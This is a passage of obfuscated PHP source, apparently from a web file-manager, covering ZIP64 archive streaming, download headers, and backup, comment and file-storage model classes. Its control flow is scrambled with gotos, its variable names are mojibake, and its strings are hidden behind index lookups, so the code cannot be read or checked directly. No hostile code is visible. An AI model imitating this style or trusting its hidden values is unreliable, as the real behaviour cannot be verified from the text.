$aàÒ÷Å¸¨¢ = $Dõí£œ¾±Ç[33]; goto C¶ñŠÂ×³; C£‹ß¡—«á: } protected function addCdr64Eof() { goto aøº­¬’; aøº­¬’: $aí§œÃíÎ˜ =& $_SERVER[¿õñ]; $Bã¾ßŠàÀí = count($this->files); $Cß‹…íÀÂš = $this->cdr_ofs; goto Eİ¸ğ«¤Ó; aÀ—µ‡ÃØò: $this->send($a…¼”¼’’); goto e­ŠÅ‹¯Óİ; Eİ¸ğ«¤Ó: $A›ÜÔ¶³º¿ = $this->ofs; $E’”ä°™Ôê = array(array($aí§œÃíÎ˜[1923], static::ZIP64_CDR_EOF_SIGNATURE), array($aí§œÃíÎ˜[1925], 44), array($aí§œÃíÎ˜[1924], static::ZIP_VERSION_64), array($aí§œÃíÎ˜[1924], static::ZIP_VERSION_64), array($aí§œÃíÎ˜[1923], 0), array($aí§œÃíÎ˜[1923], 0), array($aí§œÃíÎ˜[1925], $Bã¾ßŠàÀí), array($aí§œÃíÎ˜[1925], $Bã¾ßŠàÀí), array($aí§œÃíÎ˜[1925], $Cß‹…íÀÂš), array($aí§œÃíÎ˜[1925], $A›ÜÔ¶³º¿)); $a…¼”¼’’ = $this->packFields($E’”ä°™Ôê); goto aÀ—µ‡ÃØò; e­ŠÅ‹¯Óİ: } protected function addCdr64Locator() { goto FÂÏÃ³Ø•Ì; FÂÏÃ³Ø•Ì: $dÛ¶ŠÒéÙğ =& $_SERVER[¿õñ]; $A‰Ï²óÁ±ù = count($this->files); $DèÎ›ÙÑ‡é = $this->cdr_ofs; goto Cøğ›Ã‡Ï; Cøğ›Ã‡Ï: $b¯Õ¸÷—é = $this->ofs; $bÂŒ­¨Õ‰Ç = array(array($dÛ¶ŠÒéÙğ[1923], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($dÛ¶ŠÒéÙğ[1923], 0), array($dÛ¶ŠÒéÙğ[1925], $b¯Õ¸÷—é + $DèÎ›ÙÑ‡é), array($dÛ¶ŠÒéÙğ[1923], 1)); $AÈÄ Üµí‘ = $this->packFields($bÂŒ­¨Õ‰Ç); goto Fƒï­¹é•¿; Fƒï­¹é•¿: $this->send($AÈÄ Üµí‘); goto f°İºò„½Ó; f°İºò„½Ó: } protected function addCdrEof() { goto FÁª¢ÒŠÓŠ; FÁª¢ÒŠÓŠ: $aä•ÕÈ÷Şô =& $_SERVER[¿õñ]; $Dİê§Ø’õ§ = count($this->files); $DíêÉ¯«¸œ = $this->cdr_ofs; goto céÉ…ëµ°Ñ; bÆøŸªÓ½: $a†ŠÖ¤Ã¹ = $this->packFields($C²Ø÷Âİ³ò) . $E›•Ù‘áÍß; $this->send($a†ŠÖ¤Ã¹); goto d²œï­á†; céÉ…ëµ°Ñ: $f»¯Í´øÀç = $this->ofs; $E›•Ù‘áÍß = $aä•ÕÈ÷Şô[33]; $C²Ø÷Âİ³ò = array(array($aä•ÕÈ÷Şô[1923], static::CDR_EOF_SIGNATURE), array($aä•ÕÈ÷Şô[1924], 0), array($aä•ÕÈ÷Şô[1924], 0), array($aä•ÕÈ÷Şô[1924], $Dİê§Ø’õ§), array($aä•ÕÈ÷Şô[1924], $Dİê§Ø’õ§), array($aä•ÕÈ÷Şô[1923], 4294967295), array($aä•ÕÈ÷Şô[1923], 4294967295), array($aä•ÕÈ÷Şô[1924], strlen($E›•Ù‘áÍß))); goto bÆøŸªÓ½; d²œï­á†: } protected function addCdr() { foreach ($this->files as $dîÏØ‰ÜØˆ) { $this->addCdrFile($dîÏØ‰ÜØˆ); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $f®“×¥Œ‘ñ =& $_SERVER[¿õñ]; $cÃŠÕ»¿¶œ = $f®“×¥Œ‘ñ[199]; if ($this->outputName) { $e„Ø²†Ÿ‘Ú = trim(str_replace(array($f®“×¥Œ‘ñ[112], $f®“×¥Œ‘ñ[55], $f®“×¥Œ‘ñ[94], $f®“×¥Œ‘ñ[68], $f®“×¥Œ‘ñ[214], $f®“×¥Œ‘ñ[726]), $f®“×¥Œ‘ñ[33], $this->outputName)); $aôÑµ“È© = rawurlencode($e„Ø²†Ÿ‘Ú); $cÃŠÕ»¿¶œ .= "\73\40\146\x69\154\145\x6e\141\155\145\52\75\x75\164\146\x2d\x38\47\x27{$aôÑµ“È©}"; } $a„µáƒùË = array($f®“×¥Œ‘ñ[196] => $f®“×¥Œ‘ñ[1926], $f®“×¥Œ‘ñ[1927] => $cÃŠÕ»¿¶œ, $f®“×¥Œ‘ñ[1928] => $f®“×¥Œ‘ñ[1929], $f®“×¥Œ‘ñ[1930] => $f®“×¥Œ‘ñ[1931], $f®“×¥Œ‘ñ[1932] => $f®“×¥Œ‘ñ[1933]); foreach ($a„µáƒùË as $EˆÙ½ƒÄáĞ => $aÓˆ÷½ªÊß) { header($EˆÙ½ƒÄáĞ . $f®“×¥Œ‘ñ[887] . $aÓˆ÷½ªÊß); } } protected function send($f©¦ÜøÄ¨) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $f©¦ÜøÄ¨); } protected final function dosTime($CŠ²ğèÎ‡›) { $EÂæ†‘¦¼ =& $_SERVER[¿õñ]; $bä«÷¹Ë© = getdate($CŠ²ğèÎ‡›); if ($bä«÷¹Ë©[$EÂæ†‘¦¼[1633]] < 1980) { $bä«÷¹Ë© = array($EÂæ†‘¦¼[1633] => 1980, $EÂæ†‘¦¼[1934] => 1, $EÂæ†‘¦¼[1935] => 1, $EÂæ†‘¦¼[1936] => 0, $EÂæ†‘¦¼[1937] => 0, $EÂæ†‘¦¼[1938] => 0); } $bä«÷¹Ë©[$EÂæ†‘¦¼[1633]] -= 1980; return $bä«÷¹Ë©[$EÂæ†‘¦¼[1633]] << 25 | $bä«÷¹Ë©[$EÂæ†‘¦¼[1934]] << 21 | $bä«÷¹Ë©[$EÂæ†‘¦¼[1935]] << 16 | $bä«÷¹Ë©[$EÂæ†‘¦¼[1936]] << 11 | $bä«÷¹Ë©[$EÂæ†‘¦¼[1937]] << 5 | $bä«÷¹Ë©[$EÂæ†‘¦¼[1938]] >> 1; } protected function packFields($F§Æóéä°Â) { $EÜÂäƒµ® =& $_SERVER[¿õñ]; $b­¨öïÍ’Ñ = $EÜÂäƒµ®[33]; $eĞŠ‰Ì¶¢Š = array(); foreach ($F§Æóéä°Â as $aˆ®ôÛƒø) { $b­¨öïÍ’Ñ .= $aˆ®ôÛƒø[0]; $eĞŠ‰Ì¶¢Š[] = $aˆ®ôÛƒø[1]; } array_unshift($eĞŠ‰Ì¶¢Š, $b­¨öïÍ’Ñ); return call_user_func_array($EÜÂäƒµ®[1939], $eĞŠ‰Ì¶¢Š); } protected function filterFilename($C‚çÃ”—®») { $bá‰Éé÷Ã =& $_SERVER[¿õñ]; return str_replace(array($bá‰Éé÷Ã[94], $bá‰Éé÷Ã[4], $bá‰Éé÷Ã[173], $bá‰Éé÷Ã[70], $bá‰Éé÷Ã[112], $bá‰Éé÷Ã[932], $bá‰Éé÷Ã[935], $bá‰Éé÷Ã[268]), $bá‰Éé÷Ã[71], $C‚çÃ”—®»); } } goto CÓ«âš„®¼; CÑ™ŸÅÚ—Ì: class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\155\x2e\x62\141\143\x6b\165\x70\114\151\x73\164"; public $field = array("\151\x6f", "\156\141\x6d\x65", "\x73\x74\x61\164\x75\163", "\143\157\156\164\145\156\x74", "\x72\145\163\165\x6c\164", "\164\151\x6d\x65\x46\162\157\155", "\164\151\155\x65\x54\157"); public function config() { goto Cå®¢ö—›Ò; FŸ¦„ˆ×ÖÔ: $BìÛ««… = is_array($BìÛ««…) ? $BìÛ««… : array(); if (!isset($BìÛ««…[$dšÆ·Ÿ¬[689]])) { $BìÛ««…[$dšÆ·Ÿ¬[689]] = $dšÆ·Ÿ¬[464]; } $AÖ‡ğòñåŒ = array(); goto C±Ï„Í•‘³; Bƒ¤¼¹ÕÏ: if (isset($AÖ‡ğòñåŒ[$dšÆ·Ÿ¬[187]])) { $AÖ‡ğòñåŒ[$dšÆ·Ÿ¬[187]] = json_decode($AÖ‡ğòñåŒ[$dšÆ·Ÿ¬[187]], !0); } if (isset($BìÛ««…[$dšÆ·Ÿ¬[187]])) { $AÖ‡ğòñåŒ[$dšÆ·Ÿ¬[187]][$dšÆ·Ÿ¬[1325]] = $BìÛ««…[$dšÆ·Ÿ¬[187]]; unset($BìÛ««…[$dšÆ·Ÿ¬[187]]); } return array_merge($AÖ‡ğòñåŒ, $BìÛ««…); goto BòÂ’…¦éò; Cå®¢ö—›Ò: $dšÆ·Ÿ¬ =& $_SERVER[¿õñ]; $BìÛ««… = Model($dšÆ·Ÿ¬[1067])->get($dšÆ·Ÿ¬[708]); $BìÛ««… = json_decode($BìÛ««…, !0); goto FŸ¦„ˆ×ÖÔ; C±Ï„Í•‘³: Action($dšÆ·Ÿ¬[2035])->taskInit(); $cùè…™™Ö = Model($dšÆ·Ÿ¬[2036])->listData(); foreach ($cùè…™™Ö as $D¹„šåİ) { if ($D¹„šåİ[$dšÆ·Ÿ¬[1059]] == $dšÆ·Ÿ¬[493] && $D¹„šåİ[$dšÆ·Ÿ¬[1338]] == $dšÆ·Ÿ¬[2037]) { $AÖ‡ğòñåŒ = $D¹„šåİ; break; } } goto Bƒ¤¼¹ÕÏ; BòÂ’…¦éò: } public function listData($bÔ¹Œ®ã‡ = false, $Fíñ†à = "\155\157\x64\151\x66\171\x54\x69\155\145", $bâ¥À÷‘ù‚ = false) { return parent::listData($bÔ¹Œ®ã‡, $Fíñ†à, !0); } public function lastItem() { $EùÁ–¾§ = $this->listData(); return !empty($EùÁ–¾§[0]) ? $EùÁ–¾§[0] : null; } public function kill($Dë‹ïğàŠô) { goto fİÂãÀ¹óÓ; B£„Ãå–ª: $B÷Ï³èÛìÀ = $F«¬­«óçº[$EÖ¾Ø›àœ…[28]]; $d‰Öà¤»åó = TEMP_FILES . $EÖ¾Ø›àœ…[715] . $B÷Ï³èÛìÀ . $EÖ¾Ø›àœ…[8]; IO::remove($d‰Öà¤»åó, !1); goto Cä¨„Ï†«; Cä¨„Ï†«: return $this->remove($Dë‹ïğàŠô); goto EãºÄ÷õ; fİÂãÀ¹óÓ: $EÖ¾Ø›àœ… =& $_SERVER[¿õñ]; $F«¬­«óçº = $this->listData($Dë‹ïğàŠô); if (!$F«¬­«óçº || empty($F«¬­«óçº[$EÖ¾Ø›àœ…[28]])) { return !0; } goto a½Ğ­ã‚ê; a½Ğ­ã‚ê: Task::kill($EÖ¾Ø›àœ…[707]); Task::kill($EÖ¾Ø›àœ…[737]); Task::kill($EÖ¾Ø›àœ…[744]); goto B£„Ãå–ª; EãºÄ÷õ: } public function remove($e¢íËù÷±Ù) { $f¯Îâ–¤ª = $this->listData($e¢íËù÷±Ù); if (!$f¯Îâ–¤ª) { return !0; } return $this->backupRemove($f¯Îâ–¤ª); } private function backupRemove($bš½‚ÑŠ²í) { $dÌ‹ñáÍõ¦ =& $_SERVER[¿õñ]; parent::remove($bš½‚ÑŠ²í[$dÌ‹ñáÍõ¦[364]]); $bÁíÃç”¬ = "\173\x69\157\72{$bš½‚ÑŠ²í[$dÌ‹ñáÍõ¦[688]]}\175\x2f\144\x61\x74\141\142\141\x73\x65\57" . $bš½‚ÑŠ²í[$dÌ‹ñáÍõ¦[28]]; IO::remove($bÁíÃç”¬, !1); return !0; } public function start() { goto F–‚È•ÓŞ; bŠ¿º¼‚‚: if (Hook::trigger($E­””ËÅóà[2038]) == $E­””ËÅóà[2039]) { return !0; } $d–ï…Éãªõ = $this->process(); foreach ($d–ï…Éãªõ as $f«¿‚ĞµÉ) { if ($f«¿‚ĞµÉ) { return Task::restart($f«¿‚ĞµÉ[$E­””ËÅóà[364]]); } } goto e‡·Ğêö„; F–‚È•ÓŞ: $E­””ËÅóà =& $_SERVER[¿õñ]; $BéÇ‘¨×Ç = $this->config(); if (!$BéÇ‘¨×Ç || $BéÇ‘¨×Ç[$E­””ËÅóà[1323]] != $E­””ËÅóà[493]) { return !1; } goto bŠ¿º¼‚‚; e‡·Ğêö„: $e¦–õ™‚ = new Backup(); $e¦–õ™‚->keep(); if (!$e¦–õ™‚->db()) { return !1; } goto dÏñÁÈÇ…©; DÅíéÄã×‰: return !0; goto A­ò¦°ëö; dÏñÁÈÇ…©: if (!$e¦–õ™‚->dbFile()) { return !1; } if ($BéÇ‘¨×Ç[$E­””ËÅóà[689]] == $E­””ËÅóà[464]) { $e¦–õ™‚->file(); } Backup::set(array($E­””ËÅóà[686] => 1, $E­””ËÅóà[700] => time())); goto DÅíéÄã×‰; A­ò¦°ëö: } public function process() { $a†Œ•¹š¯» =& $_SERVER[¿õñ]; return array($a†Œ•¹š¯»[691] => Task::get($a†Œ•¹š¯»[707]), $a†Œ•¹š¯»[694] => Task::get($a†Œ•¹š¯»[737]), $a†Œ•¹š¯»[164] => Task::get($a†Œ•¹š¯»[744])); } public function restore() { $aõ•Æœ¬¥ì =& $_SERVER[¿õñ]; ActionCall($aõ•Æœ¬¥ì[2040], !0, 1); ActionCall($aõ•Æœ¬¥ì[2040], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\x6d\145\x6e\164"; protected $tableMeta = array("\164\141\142\154\x65\116\x61\x6d\145" => "\x63\x6f\155\155\x65\156\164\x5f\155\145\x74\141", "\155\x65\164\141\x46\151\145\154\x64" => "\143\x6f\x6d\155\x65\156\164\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($bğé³ì«§Ó) { $d¥‘ãîª®ñ =& $_SERVER[¿õñ]; if ($bğé³ì«§Ó[$d¥‘ãîª®ñ[2041]]) { $d¹éäŠ˜…É = $this->where(array($d¥‘ãîª®ñ[2042] => $bğé³ì«§Ó[$d¥‘ãîª®ñ[2041]]))->find(); if (!$d¹éäŠ˜…É || $d¹éäŠ˜…É[$d¥‘ãîª®ñ[368]] != $bğé³ì«§Ó[$d¥‘ãîª®ñ[368]] || $d¹éäŠ˜…É[$d¥‘ãîª®ñ[452]] != $bğé³ì«§Ó[$d¥‘ãîª®ñ[452]]) { return !1; } $this->where(array($d¥‘ãîª®ñ[2042] => $bğé³ì«§Ó[$d¥‘ãîª®ñ[2041]]))->setAdd($d¥‘ãîª®ñ[2043], 1); } return $this->add($bğé³ì«§Ó); } public function remove($b¸¼í¾á‰ô) { $e…†‡š¶î =& $_SERVER[¿õñ]; $c¡»¿Õ¼¶ó = array($e…†‡š¶î[2042] => $b¸¼í¾á‰ô); $BÅã«Š‰áá = $this->where($c¡»¿Õ¼¶ó)->find(); if ($BÅã«Š‰áá[$e…†‡š¶î[2041]]) { $this->where(array($e…†‡š¶î[2042] => $BÅã«Š‰áá[$e…†‡š¶î[2041]]))->setAdd($e…†‡š¶î[2043], -1); } return $this->where($c¡»¿Õ¼¶ó)->delete(); } public function edit($DÚ†Å‘¦¯Ë, $bÕÅ˜šâŸ‘) { $C•Œ¬É”ö… =& $_SERVER[¿õñ]; $DÍ…çÍ = array($C•Œ¬É”ö…[2042] => $DÚ†Å‘¦¯Ë); return $this->where($DÍ…çÍ)->save(array($C•Œ¬É”ö…[2044] => $bÕÅ˜šâŸ‘)); } public function prasise($e…­Œ²µÙ¸) { $b£åÏîî¦ =& $_SERVER[¿õñ]; $C˜­•ôñÓ = Model($b£åÏîî¦[2045]); $EÂçä´ÀĞ’ = array($b£åÏîî¦[2042] => $e…­Œ²µÙ¸, $b£åÏîî¦[1341] => USER_ID); $E Êª’î = $C˜­•ôñÓ->where($EÂçä´ÀĞ’)->find(); if (!$E Êª’î) { $C˜­•ôñÓ->add($EÂçä´ÀĞ’); $a›ÕÌ¨ò´ = $this->where(array($b£åÏîî¦[2042] => $e…­Œ²µÙ¸))->setAdd($b£åÏîî¦[2046], 1); } else { $C˜­•ôñÓ->where($EÂçä´ÀĞ’)->delete(); $a›ÕÌ¨ò´ = $this->where(array($b£åÏîî¦[2042] => $e…­Œ²µÙ¸))->setAdd($b£åÏîî¦[2046], -1); } return $a›ÕÌ¨ò´; } public function targetInfo($F´…ÆÛ˜š, $F«ïÙ††‰¤) { goto cƒ–¼ÛçÕÄ; AÕÙ›ğ•ÙÁ: $c‚‚İñğ…¬ = "\x52\x49\107\x48\x54\x20\112\x4f\x49\116\40{$this->tablePrefix}\x63\157\155\155\x65\156\x74\137\x70\162\x61\151\163\x65\x20\x73\x74\141\162\x20\x6f\156\40\x63\157\155\x6d\145\156\164\x2e\143\x6f\155\x6d\145\x6e\164\x49\x44\40\75\40\163\x74\x61\162\56\143\157\155\x6d\x65\156\x74\x49\104"; $E¡˜á±‹ê = $this->alias($C°Ï©¸¤œ[337])->where($f£ó½±¿Œ¯)->join($c‚‚İñğ…¬, $C°Ï©¸¤œ[2047])->count(); $c‹Ï‘Á´”Û = array($C°Ï©¸¤œ[2048] => $A’”…„§ÓŸ, $C°Ï©¸¤œ[2049] => $E¡˜á±‹ê); goto cÓ¤£Ëé¸¦; cƒ–¼ÛçÕÄ: $C°Ï©¸¤œ =& $_SERVER[¿õñ]; $f£ó½±¿Œ¯ = array($C°Ï©¸¤œ[514] => $F´…ÆÛ˜š, $C°Ï©¸¤œ[515] => $F«ïÙ††‰¤); $A’”…„§ÓŸ = $this->where($f£ó½±¿Œ¯)->count(); goto AÕÙ›ğ•ÙÁ; cÓ¤£Ëé¸¦: return $c‹Ï‘Á´”Û; goto fÆÇØ¨®åÒ; fÆÇØ¨®åÒ: } public function listData($dŠÅÔØÅêâ) { $F´‰ôÇ²ÄÍ =& $_SERVER[¿õñ]; if (isset($dŠÅÔØÅêâ[$F´‰ôÇ²ÄÍ[2050]])) { if ($dŠÅÔØÅêâ[$F´‰ôÇ²ÄÍ[2050]]) { $dŠÅÔØÅêâ[$F´‰ôÇ²ÄÍ[2051]] = array($F´‰ôÇ²ÄÍ[935], intval($dŠÅÔØÅêâ[$F´‰ôÇ²ÄÍ[2050]])); } unset($dŠÅÔØÅêâ[$F´‰ôÇ²ÄÍ[2050]]); } if (isset($dŠÅÔØÅêâ[$F´‰ôÇ²ÄÍ[2052]])) { if ($dŠÅÔØÅêâ[$F´‰ôÇ²ÄÍ[2052]]) { $dŠÅÔØÅêâ[$F´‰ôÇ²ÄÍ[2051]] = array($F´‰ôÇ²ÄÍ[932], intval($dŠÅÔØÅêâ[$F´‰ôÇ²ÄÍ[2052]])); } unset($dŠÅÔØÅêâ[$F´‰ôÇ²ÄÍ[2052]]); } return $this->_listData($dŠÅÔØÅêâ); } private function _listData($b±ËÒ—·¿é) { $fÔ÷éŞ¡ùš =& $_SERVER[¿õñ]; $BŞ³÷Åãèù = $this->where($b±ËÒ—·¿é)->_makeOrder()->selectPage(100); $this->_listAppendParent($BŞ³÷Åãèù[$fÔ÷éŞ¡ùš[350]]); $this->_listAppendUser($BŞ³÷Åãèù[$fÔ÷éŞ¡ùš[350]]); $this->_listAppendMeta($BŞ³÷Åãèù[$fÔ÷éŞ¡ùš[350]]); return $BŞ³÷Åãèù; } private function _makeOrder() { $f…øÁñê·÷ =& $_SERVER[¿õñ]; $c‡¶ÑÆö× = array($f…øÁñê·÷[2046], $f…øÁñê·÷[2043], $f…øÁñê·÷[184]); $E³†ÒËÔª = Input::get($f…øÁñê·÷[403], $f…øÁñê·÷[7], $f…øÁñê·÷[386], $c‡¶ÑÆö×); $eËõ£½ñšÔ = Input::get($f…øÁñê·÷[404], $f…øÁñê·÷[7], $f…øÁñê·÷[1343], array($f…øÁñê·÷[2053], $f…øÁñê·÷[401])); $D¹èøÖ¼ŒÑ = $E³†ÒËÔª . $f…øÁñê·÷[50] . $eËõ£½ñšÔ; return $this->order($D¹èøÖ¼ŒÑ); } private function _listAppendParent(&$E‹åºĞ†ª) { goto f›¾ì¢Ì§; Eš‡‰¬é: if (!$e¼£Û¹ä¢) { return; } $b‰œ¤³¼ = $this->where(array($bÄŒ•Å¦‰ˆ[2042] => array($bÄŒ•Å¦‰ˆ[7], $e¼£Û¹ä¢)))->select(); $b‰œ¤³¼ = array_to_keyvalue($b‰œ¤³¼, $bÄŒ•Å¦‰ˆ[2051]); goto c³á¸ö±; c³á¸ö±: foreach ($E‹åºĞ†ª as &$fôæÏÂÇì‘) { if (isset($b‰œ¤³¼[$fôæÏÂÇì‘[$bÄŒ•Å¦‰ˆ[2041]]])) { $fôæÏÂÇì‘[$bÄŒ•Å¦‰ˆ[2054]] = $b‰œ¤³¼[$fôæÏÂÇì‘[$bÄŒ•Å¦‰ˆ[2041]]]; } } goto aÎŠ¥Š‡øñ; f›¾ì¢Ì§: $bÄŒ•Å¦‰ˆ =& $_SERVER[¿õñ]; $e¼£Û¹ä¢ = array_unique(array_to_keyvalue($E‹åºĞ†ª, $bÄŒ•Å¦‰ˆ[33], $bÄŒ•Å¦‰ˆ[2041])); $e¼£Û¹ä¢ = array_remove_value($e¼£Û¹ä¢, $bÄŒ•Å¦‰ˆ[464]); goto Eš‡‰¬é; aÎŠ¥Š‡øñ: } private function _listAppendUser(&$b—ìÜÈ‰) { goto Dª¤„é¶ï¤; få§‰£ˆÑÀ: foreach ($b—ìÜÈ‰ as &$EË¾–ÎğËØ) { $EË¾–ÎğËØ[$AíõÛñçÆ[527]] = $D¦“›ˆñì[$EË¾–ÎğËØ[$AíõÛñçÆ[1350]]]; if (isset($EË¾–ÎğËØ[$AíõÛñçÆ[2054]])) { $EË¾–ÎğËØ[$AíõÛñçÆ[2054]][$AíõÛñçÆ[527]] = $D¦“›ˆñì[$EË¾–ÎğËØ[$AíõÛñçÆ[2054]][$AíõÛñçÆ[1350]]]; } } goto e²‘ ¯±‘ˆ; A÷Ä˜ÓçŸ: if (count($Bâ¯ùÌ¬¨ô) == 0) { return; } foreach ($b—ìÜÈ‰ as $EË¾–ÎğËØ) { if (isset($EË¾–ÎğËØ[$AíõÛñçÆ[2054]])) { $Bâ¯ùÌ¬¨ô[] = $EË¾–ÎğËØ[$AíõÛñçÆ[2054]][$AíõÛñçÆ[1350]]; } } $D¦“›ˆñì = Model($AíõÛñçÆ[469])->userListInfo($Bâ¯ùÌ¬¨ô); goto få§‰£ˆÑÀ; Dª¤„é¶ï¤: $AíõÛñçÆ =& $_SERVER[¿õñ]; $Bâ¯ùÌ¬¨ô = array_unique(array_to_keyvalue($b—ìÜÈ‰, $AíõÛñçÆ[33], $AíõÛñçÆ[1350])); $Bâ¯ùÌ¬¨ô = array_remove_value($Bâ¯ùÌ¬¨ô, $AíõÛñçÆ[464]); goto A÷Ä˜ÓçŸ; e²‘ ¯±‘ˆ: } private function _listAppendMeta(&$d¬­´çêœ) { goto cªÑÉŞ”¾·; cÀƒÔçŠ¸: if (!$C±…‡å±) { return; } foreach ($d¬­´çêœ as $CË»Ÿ®…×Ç) { if (isset($CË»Ÿ®…×Ç[$b“ÇÜ«çÔ–[2054]])) { $C±…‡å±[] = $CË»Ÿ®…×Ç[$b“ÇÜ«çÔ–[2054]][$b“ÇÜ«çÔ–[2051]]; } } $Aää¬–®í‚ = $this->metaList($C±…‡å±); goto FŒäŠ‹è‘í; FŒäŠ‹è‘í: if (!$Aää¬–®í‚) { return !1; } foreach ($d¬­´çêœ as &$CË»Ÿ®…×Ç) { $CË»Ÿ®…×Ç[$b“ÇÜ«çÔ–[413]] = $Aää¬–®í‚[$CË»Ÿ®…×Ç[$b“ÇÜ«çÔ–[2051]]]; if (isset($CË»Ÿ®…×Ç[$b“ÇÜ«çÔ–[2054]])) { $CË»Ÿ®…×Ç[$b“ÇÜ«çÔ–[2054]][$b“ÇÜ«çÔ–[413]] = $Aää¬–®í‚[$CË»Ÿ®…×Ç[$b“ÇÜ«çÔ–[2054]][$b“ÇÜ«çÔ–[2051]]]; } } goto dÒíë«Š; cªÑÉŞ”¾·: $b“ÇÜ«çÔ– =& $_SERVER[¿õñ]; $C±…‡å± = array_unique(array_to_keyvalue($d¬­´çêœ, $b“ÇÜ«çÔ–[33], $b“ÇÜ«çÔ–[2051])); $C±…‡å± = array_remove_value($C±…‡å±, $b“ÇÜ«çÔ–[464]); goto cÀƒÔçŠ¸; dÒíë«Š: } private function metaList($bŠ˜ Ô¸ï) { goto CéİøÒî™; CéİøÒî™: $A¬ÅãÈ½áò =& $_SERVER[¿õñ]; if (!$bŠ˜ Ô¸ï) { return array(); } $cÍÉ‚ÏÚ¬‰ = array($A¬ÅãÈ½áò[2051] => array($A¬ÅãÈ½áò[7], $bŠ˜ Ô¸ï)); goto D¯¥èÉ ÇÉ; FÁÆÁÖŠá‡: return $F‡Ùˆ”Ğ¤‚ ? $F‡Ùˆ”Ğ¤‚ : array(); goto Cø¬™å­Ÿ; D¯¥èÉ ÇÉ: $F‡Ùˆ”Ğ¤‚ = Model($A¬ÅãÈ½áò[2055])->where($cÍÉ‚ÏÚ¬‰)->select(); $F‡Ùˆ”Ğ¤‚ = array_to_keyvalue_group($F‡Ùˆ”Ğ¤‚, $A¬ÅãÈ½áò[2051]); foreach ($F‡Ùˆ”Ğ¤‚ as $dìŞÇ¢ˆ’ñ => $e°ÎÚÒØ¶¾) { $C¿ùà°¶ŸŞ = array(); foreach ($e°ÎÚÒØ¶¾ as $Cë„÷•®Øï) { $C¿ùà°¶ŸŞ[$Cë„÷•®Øï[$A¬ÅãÈ½áò[88]]] = $Cë„÷•®Øï[$A¬ÅãÈ½áò[354]]; } $F‡Ùˆ”Ğ¤‚[$dìŞÇ¢ˆ’ñ] = $C¿ùà°¶ŸŞ; } goto FÁÆÁÖŠá‡; Cø¬™å­Ÿ: } } class FileModel extends ModelBase { protected $tableName = "\151\x6f\137\146\151\154\x65"; protected $tableMeta = array("\x74\x61\142\x6c\x65\x4e\141\155\145" => "\151\x6f\x5f\x66\x69\x6c\x65\x5f\155\x65\x74\x61", "\155\145\x74\x61\106\151\x65\154\144" => "\146\x69\154\x65\111\x44"); public function fileInfo($Câ‰¿„½°¼) { $D…®‚¼¸ö =& $_SERVER[¿õñ]; static $F‡ù­ƒó›‹ = array(); if (!isset($F‡ù­ƒó›‹[$Câ‰¿„½°¼])) { $E”¨¥ï °… = $D…®‚¼¸ö[2056]; $DÄ«‡Æç– = Model($D…®‚¼¸ö[418])->field($E”¨¥ï °…)->where(array($D…®‚¼¸ö[416] => $Câ‰¿„½°¼))->find(); $F‡ù­ƒó›‹[$Câ‰¿„½°¼] = $DÄ«‡Æç–; } return $F‡ù­ƒó›‹[$Câ‰¿„½°¼]; } public function addFileByContent($b­Ó•²àêÖ = '', $D«²Çã ÈÕ = '') { goto bŸŒŒ¦†¯ø; AÀîß„–ˆ: $BîÁäÊË½š = $Aòï›Ô•°© . $Açì¼·ìÊÙ[2058] . rand_string(16); file_put_contents($BîÁäÊË½š, $b­Ó•²àêÖ); $dê¬²â”ª‰ = $this->addFile($BîÁäÊË½š, $D«²Çã ÈÕ, !0); goto Eõ‘±îæˆí; Eõ‘±îæˆí: if (file_exists($BîÁäÊË½š)) { @unlink($BîÁäÊË½š); } return $dê¬²â”ª‰; goto A‡‹Ñ½õ‹Õ; bŸŒŒ¦†¯ø: $Açì¼·ìÊÙ =& $_SERVER[¿õñ]; $Aòï›Ô•°© = TEMP_PATH . $Açì¼·ìÊÙ[2057]; if (!is_dir($Aòï›Ô•°©)) { mk_dir($Aòï›Ô•°©); } goto AÀîß„–ˆ; A‡‹Ñ½õ‹Õ: } public function createFileName($bß®¥õ­¿) { goto aæ‹Õø´£·; FµÓï£·Š²: $a”ä™ê‚ = $eÍŒàŠŒø¡->pathFather($Fö†ßÂàÁê); static $dŠ†¯ÁÁ÷Ü = false; $Fâò‘ÕÒ = $E”ÆÏÕ¢òä[2059] . md5($a”ä™ê‚); goto bˆŠÒñ”ÂÊ; bˆŠÒñ”ÂÊ: if (!$dŠ†¯ÁÁ÷Ü && !Cache::get($Fâò‘ÕÒ)) { $dŠ†¯ÁÁ÷Ü = !0; $f¼–Şò§¡¡ = IO::mkdir($a”ä™ê‚); if (!IO::exist($f¼–Şò§¡¡ . $E”ÆÏÕ¢òä[2060])) { IO::mkfile($f¼–Şò§¡¡ . $E”ÆÏÕ¢òä[2060]); } Cache::set($Fâò‘ÕÒ, 1, 3600 * 2); } return $Fö†ßÂàÁê; goto eáŒïÁŒº; aæ‹Õø´£·: $E”ÆÏÕ¢òä =& $_SERVER[¿õñ]; $eÍŒàŠŒø¡ = IO::init($E”ÆÏÕ¢òä[8]); $Fö†ßÂàÁê = $this->makeFilePath($bß®¥õ­¿, $eÍŒàŠŒø¡); goto FµÓï£·Š²; eáŒïÁŒº: } public function makeFilePath($dáèÜˆá£, $b„¯Ü‹Æ†•) { goto d…ºØ¸¤Ó; d…ºØ¸¤Ó: $b¡£”ÄÇº¶ =& $_SERVER[¿õñ]; $f÷ÚÎ¡Á® = Model($b¡£”ÄÇº¶[1067])->get($b¡£”ÄÇº¶[2061]); $a¦½‚êø…Å = KodIO::defaultIO() . date($b¡£”ÄÇº¶[2062]); goto cÀ•“›´êÒ; Bëâª”‰Ğ: switch ($f÷ÚÎ¡Á®) { case $b¡£”ÄÇº¶[2064]: $aá‰ñøØÖ = $aá‰ñøØÖ . $b¡£”ÄÇº¶[92] . $b„¯Ü‹Æ†•->ext($dáèÜˆá£); if ($b„¯Ü‹Æ†•->ext($dáèÜˆá£) == $b¡£”ÄÇº¶[2003]) { $aá‰ñøØÖ .= $b¡£”ÄÇº¶[2065]; } break; case 